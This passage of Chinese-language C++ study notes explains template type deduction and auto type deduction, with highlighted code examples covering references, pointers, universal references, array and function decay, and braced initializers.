cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T&amp; param)</span></span>;         <span class="hljs-comment">//param现在是reference-to-const</span><br><br><span class="hljs-keyword">int</span> x = <span class="hljs-number">27</span>;                     <span class="hljs-comment">//如之前一样</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> cx = x;               <span class="hljs-comment">//如之前一样</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span>&amp; rx = x;              <span class="hljs-comment">//如之前一样</span><br><br>f(x);                           <span class="hljs-comment">//T是int，param的类型是const int&amp;</span><br>f(cx);                          <span class="hljs-comment">//T是int，param的类型是const int&amp;</span><br>f(rx);                          <span class="hljs-comment">//T是int，param的类型是const int&amp;</span><br></code></pre></div></td></tr></table></figure><p>同之前一样，<code>rx</code>的reference-ness在类型推导中被忽略了。</p><p>如果<code>param</code>是一个指针（或者指向<code>const</code>的指针）而不是引用，情况本质上也一样：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T* param)</span></span>;               <span class="hljs-comment">//param现在是指针</span><br><br><span class="hljs-keyword">int</span> x = <span class="hljs-number">27</span>;                     <span class="hljs-comment">//同之前一样</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> *px = &amp;x;             <span class="hljs-comment">//px是指向作为const int的x的指针</span><br><br>f(&amp;x);                          <span class="hljs-comment">//T是int，param的类型是int*</span><br>f(px);                          <span class="hljs-comment">//T是const int，param的类型是const int*</span><br></code></pre></div></td></tr></table></figure><h3><span id="paramtype是一个通用引用"><code>ParamType</code>是一个通用引用</span></h3><p>形参被声明为像右值引用一样（也就是，在函数模板中假设有一个类型形参<code>T</code>，那么通用引用声明形式就是<code>T&amp;&amp;</code>)。</p><ul><li><p>如果<code>expr</code>是左值，<code>T</code>和<code>ParamType</code>都会被推导为左值引用。</p><blockquote><ul><li><p>这是模板类型推导中唯一一种<code>T</code>被推导为引用的情况。</p></li><li><p>虽然<code>ParamType</code>被声明为右值引用类型，但是最后推导的结果是左值引用。</p></li></ul></blockquote></li><li><p>如果<code>expr</code>是右值，就使用正常的（也就是上一节中的）推导规则</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T&amp;&amp; param)</span></span>;              <span class="hljs-comment">//param现在是一个通用引用类型</span><br><br><span class="hljs-keyword">int</span> x=<span class="hljs-number">27</span>;                      <br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> cx=x;             <br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> &amp; rx=cx;      <br><br>f(x);                           <span class="hljs-comment">//x是左值，所以T是int&amp;，</span><br>                                <span class="hljs-comment">//param类型也是int&amp;</span><br><br>f(cx);                          <span class="hljs-comment">//cx是左值，所以T是const int&amp;，</span><br>                                <span class="hljs-comment">//param类型也是const int&amp;</span><br><br>f(rx);                          <span class="hljs-comment">//rx是左值，所以T是const int&amp;，</span><br>                                <span class="hljs-comment">//param类型也是const int&amp;</span><br><br>f(<span class="hljs-number">27</span>);                          <span class="hljs-comment">//27是右值，所以T是int，</span><br>                                <span class="hljs-comment">//param类型就是int&amp;&amp;</span><br></code></pre></div></td></tr></table></figure><p>通用引用的类型推导规则是不同于普通的左值或者右值引用的。尤其是，当通用引用被使用时，类型推导会区分左值实参和右值实参，但是对非通用引用时不会区分。</p><h3><span id="paramtype既不是指针也不是引用"><code>ParamType</code>既不是指针也不是引用</span></h3><p>当<code>ParamType</code>既不是指针也不是引用时，我们通过传值（pass-by-value）的方式处理：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T param)</span></span>;                <span class="hljs-comment">//以传值的方式处理param</span><br></code></pre></div></td></tr></table></figure><p>这意味着无论传递什么<code>param</code>都会成为它的一份拷贝——一个完整的新对象。事实上<code>param</code>成为一个新对象这一行为会影响<code>T</code>如何从<code>expr</code>中推导出结果。</p><ol type="1"><li>如果<code>expr</code>的类型是一个引用，忽略这个引用部分</li><li>如果忽略<code>expr</code>的引用性（reference-ness）之后，<code>expr</code>是一个<code>const</code>，那就再忽略<code>const</code>。如果它是<code>volatile</code>，也忽略<code>volatile</code>（<code>volatile</code>对象不常见，它通常用于驱动程序的开发中）</li></ol><p>因此：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> x=<span class="hljs-number">27</span>;                       <span class="hljs-comment">//如之前一样</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> cx=x;                 <span class="hljs-comment">//如之前一样</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> &amp; rx=cx;              <span class="hljs-comment">//如之前一样</span><br><br>f(x);                           <span class="hljs-comment">//T和param的类型都是int</span><br>f(cx);                          <span class="hljs-comment">//T和param的类型都是int</span><br>f(rx);                          <span class="hljs-comment">//T和param的类型都是int</span><br></code></pre></div></td></tr></table></figure><p>即使<code>cx</code>和<code>rx</code>表示<code>const</code>值，<code>param</code>也不是<code>const</code>。这是有意义的。<code>param</code>是一个完全独立于<code>cx</code>和<code>rx</code>的对象——是<code>cx</code>或<code>rx</code>的一个拷贝。</p><p>认识到只有在传值给形参时才会忽略<code>const</code>（和<code>volatile</code>）这一点很重要。对于reference-to-<code>const</code>和pointer-to-<code>const</code>形参来说，<code>expr</code>的常量性<code>const</code>ness在推导时会被保留。</p><p>例如：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T param)</span></span>;                <span class="hljs-comment">//仍然以传值的方式处理param</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-keyword">const</span> ptr =         <span class="hljs-comment">//ptr是一个常量指针，指向常量对象 </span><br>    <span class="hljs-string">"Fun with pointers"</span>;<br><br>f(ptr);                         <span class="hljs-comment">//传递const char * const类型的实参</span><br></code></pre></div></td></tr></table></figure><p>当<code>ptr</code>作为实参传给<code>f</code>，组成这个指针的每一比特都被拷贝进<code>param</code>。<code>ptr</code>自身的值会被传给形参。</p><p>在类型推导中，这个指针指向的数据的常量性<code>const</code>ness将会被保留，但是当拷贝<code>ptr</code>来创造一个新指针<code>param</code>时，<code>ptr</code>自身的常量性<code>const</code>ness将会被忽略。</p><h4><span id="数组实参">数组实参</span></h4><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> name[] = <span class="hljs-string">"J. P. Briggs"</span>;     <span class="hljs-comment">//name的类型是const char[13]</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * ptrToName = name;          <span class="hljs-comment">//数组退化为指针</span><br></code></pre></div></td></tr></table></figure><p>在这里<code>const char*</code>指针<code>ptrToName</code>会由<code>name</code>初始化，而<code>name</code>的类型为<code>const char[13]</code>，这两种类型（<code>const char*</code>和<code>const char[13]</code>）是不一样的，但是由于数组退化为指针的规则，编译器允许这样的代码。</p><p>但要是一个数组传值给一个模板会怎样？会发生什么？</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T param)</span></span>;                        <span class="hljs-comment">//传值形参的模板</span><br><br>f(name);                                <span class="hljs-comment">//T和param会推导成什么类型?</span><br></code></pre></div></td></tr></table></figure><p>数组与指针形参这样的等价是C语言的产物，C++又是建立在C语言的基础上，它让人产生了一种数组和指针是等价的的错觉。</p><p>因为数组形参会视作指针形参，所以传值给模板的一个数组类型会被推导为一个指针类型。这意味着在模板函数<code>f</code>的调用中，它的类型形参<code>T</code>会被推导为<code>const char*</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">f(name);                        <span class="hljs-comment">//name是一个数组，但是T被推导为const char*</span><br></code></pre></div></td></tr></table></figure><p>但是在C++中，虽然函数不能声明形参为真正的数组，但是<strong>可以</strong>接受指向数组的<strong>引用</strong>！所以我们修改<code>f</code>为传引用：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T&amp; param)</span></span>;                       <span class="hljs-comment">//传引用形参的模板</span><br></code></pre></div></td></tr></table></figure><p>我们这样进行调用，</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">f(name);                                <span class="hljs-comment">//传数组给f</span><br></code></pre></div></td></tr></table></figure><p><code>T</code>被推导为了真正的数组！这个类型包括了数组的大小，在这个例子中<code>T</code>被推导为<code>const char[13]</code>，<code>f</code>的形参（对这个数组的引用）的类型则为<code>const char (&amp;)[13]</code>。</p><p>可声明指向数组的引用的能力，使得我们可以创建一个模板函数来推导出数组的大小：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">//在编译期间返回一个数组大小的常量值，这里的数组形参没有名字</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> N&gt;                    <br><span class="hljs-function"><span class="hljs-keyword">constexpr</span> <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> <span class="hljs-title">arraySize</span><span class="hljs-params">(T (&amp;)[N])</span> <span class="hljs-keyword">noexcept</span> </span>&#123;                                                  <br>    <span class="hljs-keyword">return</span> N;                                     <br>&#125;<br></code></pre></div></td></tr></table></figure><p>将一个函数声明为<code>constexpr</code>使得结果在编译期间可用。这使得我们可以用一个花括号声明一个数组，然后第二个数组可以使用第一个数组的大小作为它的大小，就像这样：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> keyVals[] = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">35</span> &#125;;             <span class="hljs-comment">//keyVals有七个元素</span><br><br><span class="hljs-keyword">int</span> mappedVals[arraySize(keyVals)];                     <span class="hljs-comment">//mappedVals也有七个</span><br></code></pre></div></td></tr></table></figure><p>当然作为一个现代C++程序员，你自然应该想到使用<code>std::array</code>而不是内置的数组：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, arraySize(keyVals)&gt; mappedVals;         <span class="hljs-comment">//mappedVals的大小为7</span><br></code></pre></div></td></tr></table></figure><p>至于<code>arraySize</code>被声明为<code>noexcept</code>，会使得编译器生成更好的代码。</p><h4><span id="函数实参">函数实参</span></h4><p>在C++中不只是数组会退化为指针，函数类型也会退化为一个函数指针。对于数组类型推导的全部讨论都可以应用到函数类型推导和退化为函数指针上来。结果是：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">someFunc</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">double</span>)</span></span>;         <span class="hljs-comment">//someFunc是一个函数，</span><br>                                    <span class="hljs-comment">//类型是void(int, double)</span><br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f1</span><span class="hljs-params">(T param)</span></span>;                   <span class="hljs-comment">//传值给f1</span><br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f2</span><span class="hljs-params">(T &amp; param)</span></span>;                 <span class="hljs-comment">//传引用给f2</span><br><br>f1(someFunc);                       <span class="hljs-comment">//param被推导为指向函数的指针，</span><br>                                    <span class="hljs-comment">//类型是void(*)(int, double)</span><br>f2(someFunc);                       <span class="hljs-comment">//param被推导为指向函数的引用，</span><br>                                    <span class="hljs-comment">//类型是void(&amp;)(int, double)</span><br></code></pre></div></td></tr></table></figure><p>这个实际上没有什么不同，只是函数退化为指针。</p><h3><span id="结论">结论</span></h3><ul><li>在模板类型推导时，有引用的实参会被视为无引用，引用会被忽略</li><li>对于<strong>通用引用</strong>的推导，左值实参会被特殊对待</li><li>对于<strong>传值类型</strong>推导，<code>const</code>和/或<code>volatile</code>实参会被认为是non-<code>const</code>的和non-<code>volatile</code>的</li><li>在模板类型推导时，数组名或者函数名实参会退化为指针，除非它们被用于初始化引用模板参数类型。</li></ul><h2><span id="2-理解-auto-类型推导">2 理解 <code>auto</code> 类型推导</span></h2><p>模板类型推导使用下面这个函数模板</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(ParmaType param)</span></span>;<br><br>f(expr);                        <span class="hljs-comment">//使用一些表达式调用f</span><br></code></pre></div></td></tr></table></figure><p>在<code>f</code>的调用中，编译器使用<code>expr</code>推导<code>T</code>和<code>ParamType</code>的类型。</p><p>当一个变量使用<code>auto</code>进行声明时，<code>auto</code>扮演了模板中<code>T</code>的角色，变量的类型说明符扮演了<code>ParamType</code>的角色。</p><p>考虑这个例子：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> x = <span class="hljs-number">27</span>;<br></code></pre></div></td></tr></table></figure><p>这里<code>x</code>的类型说明符是<code>auto</code>自己，另一方面，在这个声明中：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> cx = x;<br></code></pre></div></td></tr></table></figure><p>类型说明符是<code>const auto</code>。另一个：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp; rx=cx;<br></code></pre></div></td></tr></table></figure><p>类型说明符是<code>const auto&amp;</code>。</p><p>在这里例子中要推导<code>x</code>，<code>rx</code>和<code>cx</code>的类型，编译器的行为看起来就像是认为这里每个声明都有一个模板，然后使用合适的初始化表达式进行调用：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;            <span class="hljs-comment">//概念化的模板用来推导x的类型</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func_for_x</span><span class="hljs-params">(T param)</span></span>;<br><br>func_for_x(<span class="hljs-number">27</span>);                 <span class="hljs-comment">//概念化调用：</span><br>                                <span class="hljs-comment">//param的推导类型是x的类型</span><br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;            <span class="hljs-comment">//概念化的模板用来推导cx的类型</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func_for_cx</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T param)</span></span>;<br><br>func_for_cx(x);                 <span class="hljs-comment">//概念化调用：</span><br>                                <span class="hljs-comment">//param的推导类型是cx的类型</span><br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;            <span class="hljs-comment">//概念化的模板用来推导rx的类型</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func_for_rx</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T &amp; param)</span></span>;<br><br>func_for_rx(x);                 <span class="hljs-comment">//概念化调用：</span><br>                                <span class="hljs-comment">//param的推导类型是rx的类型</span><br></code></pre></div></td></tr></table></figure><p>在使用<code>auto</code>作为类型说明符的变量声明中，类型说明符代替了<code>ParamType</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> x = <span class="hljs-number">27</span>;                    <span class="hljs-comment">//类型说明符既不是指针也不是引用</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> cx = x;              <span class="hljs-comment">//类型说明符既不是指针也不是引用</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp; rx=cx;             <span class="hljs-comment">//类型说明符是一个指针或引用但不是通用引用</span><br></code></pre></div></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span>&amp;&amp; uref1 = x;               <span class="hljs-comment">//x是int左值，</span><br>                                <span class="hljs-comment">//所以uref1类型为int&amp;</span><br><span class="hljs-keyword">auto</span>&amp;&amp; uref2 = cx;              <span class="hljs-comment">//cx是const int左值，</span><br>                                <span class="hljs-comment">//所以uref2类型为const int&amp;</span><br><span class="hljs-keyword">auto</span>&amp;&amp; uref3 = <span class="hljs-number">27</span>;              <span class="hljs-comment">//27是int右值，</span><br>                                <span class="hljs-comment">//所以uref3类型为int&amp;&amp;</span><br></code></pre></div></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> name[] =             <span class="hljs-comment">//name的类型是const char[13]</span><br> <span class="hljs-string">"R. N. Briggs"</span>;<br><br><span class="hljs-keyword">auto</span> arr1 = name;               <span class="hljs-comment">//arr1的类型是const char*</span><br><span class="hljs-keyword">auto</span>&amp; arr2 = name;              <span class="hljs-comment">//arr2的类型是const char (&amp;)[13]</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">someFunc</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">double</span>)</span></span>;     <span class="hljs-comment">//someFunc是一个函数，</span><br>                                <span class="hljs-comment">//类型为void(int, double)</span><br><br><span class="hljs-keyword">auto</span> func1 = someFunc;          <span class="hljs-comment">//func1的类型是void (*)(int, double)</span><br><span class="hljs-keyword">auto</span>&amp; func2 = someFunc;         <span class="hljs-comment">//func2的类型是void (&amp;)(int, double)</span><br></code></pre></div></td></tr></table></figure><p><code>auto</code>类型推导和模板类型推导几乎一样的工作。</p><p>如果你想声明一个带有初始值27的<code>int</code>，C++98提供两种语法选择：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> x1 = <span class="hljs-number">27</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">x2</span><span class="hljs-params">(<span class="hljs-number">27</span>)</span></span>;<br></code></pre></div></td></tr></table></figure><p>C++11由于也添加了用于支持统一初始化（<strong>uniforminitialization</strong>）的语法：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> x3 = &#123; <span class="hljs-number">27</span> &#125;;<br><span class="hljs-keyword">int</span> x4&#123; <span class="hljs-number">27</span> &#125;;<br></code></pre></div></td></tr></table></figure><p>总之，这四种不同的语法只会产生一个相同的结果：变量类型为<code>int</code>值为27。</p><p>使用 <code>auto</code> 进行的类型推导，其结果却不一样：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> x1 = <span class="hljs-number">27</span>;                   <span class="hljs-comment">//类型是int，值是27</span><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">x2</span><span class="hljs-params">(<span class="hljs-number">27</span>)</span></span>;                    <span class="hljs-comment">//同上</span><br><span class="hljs-keyword">auto</span> x3 = &#123; <span class="hljs-number">27</span> &#125;;               <span class="hljs-comment">//类型是std::initializer_list&lt;int&gt;，</span><br>                                <span class="hljs-comment">//值是&#123; 27 &#125;</span><br><span class="hljs-keyword">auto</span> x4&#123; <span class="hljs-number">27</span> &#125;;                  <span class="hljs-comment">//同上</span><br></code></pre></div></td></tr></table></figure><p>这就造成了<code>auto</code>类型推导不同于模板类型推导的特殊情况。当用<code>auto</code>声明的变量使用花括号进行初始化，<code>auto</code>类型推导推出的类型则为<code>std::initializer_list</code>。如果这样的一个类型不能被成功推导（比如花括号里面包含的是不同类型的变量），编译器会拒绝这样的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> x5 = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3.0</span> &#125;;        <span class="hljs-comment">//错误！无法推导std::initializer_list&lt;T&gt;中的T</span><br></code></pre></div></td></tr></table></figure><p>对于花括号的处理是<code>auto</code>类型推导和模板类型推导唯一不同的地方。</p><p>然而如果在模板中指定<code>T</code>是<code>std::initializer_list&lt;T&gt;</code>而留下未知<code>T</code>，模板类型推导就能正常工作：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">initializer_list</span>&lt;T&gt; initList)</span></span>;<br><br>f(&#123; <span class="hljs-number">11</span>, <span class="hljs-number">23</span>, <span class="hljs-number">9</span> &#125;);               <span class="hljs-comment">//T被推导为int，initList的类型为</span><br>                                <span class="hljs-comment">//std::initializer_list&lt;int&gt;</span><br></code></pre></div></td></tr></table></figure><blockquote><p>在C++11编程中一个典型的错误就是偶然使用了<code>std::initializer_list&lt;T&gt;</code>类型的变量。</p></blockquote><p>但是对于C++14故事还在继续，C++14允许<code>auto</code>用于函数返回值并会被推导。</p><p>而且C++14的<em>lambda</em>函数也允许在形参声明中使用<code>auto</code>。但是在这些情况下<code>auto</code>实际上使用<strong>模板类型推导</strong>的那一套规则在工作，而不是<code>auto</code>类型推导，所以说下面这样的代码不会通过编译：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">createInitList</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> &#123; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span> &#125;;         <span class="hljs-comment">//错误！不能推导&#123; 1, 2, 3 &#125;的类型</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>同样在C++14的 lambda 函数中这样使用auto也不能通过编译：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 